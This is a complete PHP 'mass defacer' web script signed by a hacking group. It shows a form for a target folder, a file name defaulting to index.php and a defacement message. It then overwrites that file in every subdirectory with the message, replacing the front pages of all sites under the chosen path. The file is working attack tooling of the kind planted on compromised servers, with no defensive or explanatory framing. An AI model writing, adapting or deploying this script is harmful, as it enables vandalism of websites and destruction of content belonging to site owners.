<?php

echo "<title>[ MASS DEFACER ]</title>"; 
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color=red'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "<br><br><br><font color='lime'>target folder : </font><input cols='20' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
echo "<font color='lime'>name of file : </font><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br><br>";
echo "<font color='lime'>script deface : </font><br><textarea cols='100' rows='10' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by 7r0j4n | LeetGh0sts Squ4d</textarea><br>";
echo "<input type='submit' value='FUCK !'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<font color='lime'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font><br>";
                }
        endforeach;
}; 
?>
